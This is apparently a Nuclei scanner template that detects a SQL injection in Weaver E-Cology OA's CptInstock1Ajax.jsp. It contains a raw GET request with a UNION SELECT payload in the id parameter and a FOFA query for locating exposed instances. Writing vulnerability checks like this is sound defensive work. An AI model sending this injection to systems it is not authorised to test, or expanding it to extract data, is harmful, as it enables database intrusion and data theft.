id: weaver-ecology-CptInstock1Ajax-sqli
info:
  name: 泛微 OA E-Cology CptInstock1Ajax.jsp - sqli
  author: leadlife
  severity: high
  description: 泛微E-Cology系统接口CptInstock1Ajax存在SQL注入漏洞，可获取数据库权限，导致数据泄露
  reference: 
    - https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEE-Cology%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3CptInstock1Ajax%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: app="泛微-OA（e-cology）"
  tags: weaver,ecology,oa,sqli

http:
  - raw:
      - |
        GET /cpt/capital/CptInstock1Ajax.jsp?id=-99+UNION+ALL+SELECT+(md5(1)),1# HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body,md5(1))
        condition: and

